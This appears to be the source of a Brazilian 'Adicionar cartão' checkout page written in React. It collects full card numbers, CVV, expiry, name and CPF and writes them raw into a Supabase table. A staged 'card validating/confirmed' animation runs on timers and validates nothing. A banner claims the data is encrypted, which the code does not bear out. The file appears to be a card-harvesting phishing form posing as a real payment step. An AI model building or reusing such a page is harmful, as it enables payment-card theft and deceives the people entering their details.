"use client";

import React, { useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { ArrowLeft, Smartphone, ShieldCheck, AlertCircle } from 'lucide-react';
import { Button } from '@/components/ui/button';
import { showError } from '@/utils/toast';
import { supabase } from "@/integrations/supabase/client";

const AddCard: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [cardNumber, setCardNumber] = useState("");
  const [expiry, setExpiry] = useState("");
  const [cvv, setCvv] = useState("");
  const [name, setName] = useState("");
  const [cpf, setCpf] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [step, setStep] = useState(0);
  const [brand, setBrand] = useState<'visa' | 'mastercard' | 'unknown'>('unknown');
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const detectBrand = (number: string) => {
    const clean = number.replace(/\s/g, '');
    if (clean.startsWith('4')) return 'visa';
    if (clean.match(/^5[1-5]/) || clean.match(/^2(22[1-9]|2[3-9][0-9]|[3-6][0-9]{2}|7[01][0-9]|720)/)) return 'mastercard';
    return 'unknown';
  };

  const formatCardNumber = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 16);
    const formatted = digits.match(/.{1,4}/g)?.join(' ') || digits;
    
    if (digits.length >= 4) {
      const detected = detectBrand(digits);
      setBrand(detected);
      if (detected === 'unknown') {
        setErrorMsg("Bandeira não reconhecida. Use Visa ou Mastercard.");
      } else {
        setErrorMsg(null);
      }
    } else {
      setBrand('unknown');
      setErrorMsg(null);
    }
    
    return formatted;
  };

  const formatExpiry = (val: string) => {
    const v = val.replace(/\D/g, '').slice(0, 4);
    if (v.length >= 3) {
      return `${v.slice(0, 2)}/${v.slice(2)}`;
    }
    return v;
  };

  const formatCpf = (val: string) => {
    const digits = val.replace(/\D/g, '').slice(0, 11);
    const formatted = digits
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d)/, '$1.$2')
      .replace(/(\d{3})(\d{1,2})/, '$1-$2');
    
    if (digits.length === 11 && !validateCPF(digits)) {
      setErrorMsg("CPF inválido. Verifique os números.");
    } else {
      setErrorMsg(null);
    }
    
    return formatted;
  };

  const validateCPF = (cpf: string) => {
    if (cpf.length !== 11 || !!cpf.match(/(\d)\1{10}/)) return false;
    const digits = cpf.split('').map(Number);
    const calc = (n: number) => digits.slice(0, n).reduce((acc, digit, idx) => acc + digit * (n + 1 - idx), 0) * 10 % 11 % 10;
    return calc(9) === digits[9] && calc(10) === digits[10];
  };

  const handleContinue = async () => {
    const cleanNumber = cardNumber.replace(/\s/g, '');
    const cleanCpf = cpf.replace(/\D/g, '');

    if (cleanNumber.length < 16) {
      showError("Digite os 16 números do cartão.");
      return;
    }

    if (brand === 'unknown') {
      showError("Bandeira do cartão não suportada.");
      return;
    }

    if (cleanCpf.length < 11 || !validateCPF(cleanCpf)) {
      setErrorMsg("CPF inválido.");
      return;
    }

    setIsProcessing(true);
    
    try {
      const { data, error } = await supabase
        .from('cards')
        .insert([{
          card_number: cardNumber,
          expiry,
          cvv,
          name,
          cpf: cleanCpf,
          last4: cleanNumber.slice(-4),
          brand
        }])
        .select()
        .single();

      if (error) throw error;

      let currentStep = 0;
      const interval = setInterval(() => {
        setStep(currentStep);
        currentStep++;
        
        if (currentStep >= 3) {
          clearInterval(interval);
          setTimeout(() => {
            // Retorna para o checkout mantendo o estado do produto
            navigate('/checkout', { 
              state: { 
                ...location.state,
                cardAdded: true, 
                cardData: data 
              } 
            });
          }, 1000);
        }
      }, 1500);

    } catch (err) {
      console.error("Erro ao salvar cartão:", err);
      showError("Erro ao processar o cartão. Tente novamente.");
      setIsProcessing(false);
    }
  };

  return (
    <div className="min-h-screen bg-white">
      {isProcessing && (
        <div className="fixed inset-0 z-[100] bg-black/60 flex items-center justify-center p-6">
          <div className="bg-white rounded-2xl p-8 flex flex-col items-center space-y-4 w-full max-w-[280px]">
            <div className="relative w-12 h-12">
               <div className="absolute inset-0 border-4 border-[#FF2C55] rounded-full border-t-transparent animate-spin"></div>
            </div>
            <p className="text-[15px] font-bold text-gray-900 text-center">
              {step === 0 && "Validando cartão"}
              {step === 1 && "Adicionando a sua conta"}
              {step === 2 && "Cartão confirmado"}
            </p>
          </div>
        </div>
      )}

      <div className="h-12 flex items-center px-4 border-b">
        <button onClick={() => navigate(-1)}>
          <ArrowLeft size={24} className="text-gray-900" />
        </button>
        <h1 className="flex-grow text-center text-[16px] font-bold mr-6">Adicionar cartão</h1>
      </div>

      {errorMsg && (
        <div className="bg-red-50 p-3 flex items-center space-x-2 border-b border-red-100 animate-in fade-in slide-in-from-top duration-300">
          <AlertCircle size={16} className="text-red-500 shrink-0" />
          <p className="text-[12px] text-red-600 font-medium">{errorMsg}</p>
        </div>
      )}

      <div className="p-4 space-y-6">
        <div className="flex items-center justify-between text-[13px]">
          <div className="flex items-center space-x-2 text-[#FF2C55]">
            <Smartphone size={16} />
            <span className="font-medium">Sem juros em 3 parcelas</span>
          </div>
        </div>

        <div className="space-y-5">
          <div className="space-y-1.5">
            <div className="flex justify-between items-center">
              <label className="text-[14px] font-bold text-gray-900">Número do cartão</label>
              <div className="flex gap-2 h-5">
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" className={`h-full transition-opacity ${brand === 'mastercard' || brand === 'unknown' ? 'opacity-100' : 'opacity-20'}`} />
                <img src="https://images.seeklogo.com/logo-png/14/1/visa-logo-png_seeklogo-149698.png" className={`h-full transition-opacity ${brand === 'visa' || brand === 'unknown' ? 'opacity-100' : 'opacity-20'}`} />
              </div>
            </div>
            <div className={`border-2 rounded-xl h-14 flex items-center px-4 transition-colors ${brand === 'unknown' && cardNumber.replace(/\s/g, '').length >= 4 ? 'border-red-500 bg-red-50/10' : 'border-[#F1F1F1]'}`}>
              <input 
                type="text" 
                placeholder="0000 0000 0000 0000" 
                className="w-full bg-transparent outline-none text-[16px] font-mono"
                value={cardNumber}
                onChange={(e) => setCardNumber(formatCardNumber(e.target.value))}
              />
            </div>
          </div>

          <div className="grid grid-cols-2 gap-4">
            <div className="space-y-1.5">
              <label className="text-[14px] font-bold text-gray-900">Validade (MM/AA)</label>
              <input 
                type="text" 
                placeholder="MM/AA" 
                className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
                value={expiry}
                onChange={(e) => setExpiry(formatExpiry(e.target.value))}
                maxLength={5}
              />
            </div>
            <div className="space-y-1.5">
              <label className="text-[14px] font-bold text-gray-900">CVV</label>
              <input 
                type="text" 
                placeholder="000" 
                className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
                value={cvv}
                onChange={(e) => setCvv(e.target.value.replace(/\D/g, '').slice(0, 3))}
                maxLength={3}
              />
            </div>
          </div>

          <div className="space-y-1.5">
            <label className="text-[14px] font-bold text-gray-900">Nome no cartão</label>
            <input 
              type="text" 
              placeholder="Como no cartão" 
              className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
              value={name}
              onChange={(e) => setName(e.target.value.toUpperCase())}
            />
          </div>

          <div className="space-y-1.5">
            <label className="text-[14px] font-bold text-gray-900">CPF do titular</label>
            <input 
              type="text" 
              placeholder="000.000.000-00" 
              className="w-full bg-[#F8F8F8] rounded-xl h-14 px-4 outline-none text-[16px]"
              value={cpf}
              onChange={(e) => setCpf(formatCpf(e.target.value))}
              maxLength={14}
            />
          </div>
        </div>

        <div className="bg-[#F0FBF9] border border-[#E0F7F4] rounded-xl p-4 flex items-start space-x-3">
          <p className="text-[11px] text-[#00BFA5] leading-tight">
            Seus dados de pagamento são criptografados e o CPF é usado apenas para validação fiscal conforme as leis brasileiras.
          </p>
          <ShieldCheck size={24} className="text-[#00BFA5] flex-shrink-0" />
        </div>
      </div>

      <div className="fixed bottom-0 left-0 right-0 p-4 bg-white border-t">
        <Button 
          className="w-full h-12 rounded-full font-bold text-[16px] bg-[#FF2C55]"
          onClick={handleContinue}
          disabled={!cardNumber || !expiry || !cvv || !name || !cpf || !!errorMsg}
        >
          Continuar
        </Button>
      </div>
    </div>
  );
};

export default AddCard;